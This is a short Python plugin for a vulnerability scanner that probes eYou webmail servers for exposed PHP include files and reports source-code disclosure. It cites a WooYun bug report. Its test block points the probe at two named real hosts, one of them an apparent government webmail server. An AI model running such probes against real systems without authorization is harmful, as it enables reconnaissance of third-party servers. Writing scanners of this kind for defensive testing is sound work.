#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2014-058462
#__Author__ = 上善若水
#_PlugName_ = eyou Plugin
#_FileName_ = eyou.py


def assign(service, arg):
    if service == "eyou":
        return True, arg    

def audit(arg):
    payloads = ('php/report/include/ldap.inc','php/report/include/util.inc','php/report/include/weblib.inc ')
    for payload in payloads:
        url = arg + payload  
        code, head, body, errcode, _url = curl.curl(url)
        if code == 200 and 'require_once("config.inc");' in body:
            security_hole(url) 
        elif code == 200 and 'require_once("util.inc");' in body:
            security_hole(url)
        elif code == 200 and 'define(\'SMSAD_FILE\', "/var/webis/etc/smsad");' in body:
            security_hole(url)
        else:
            pass
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('eyou', 'http://mail.sc-eea.cn/')[1])
    audit(assign('eyou', 'http://webmail.smart.suzhou.gov.cn/')[1])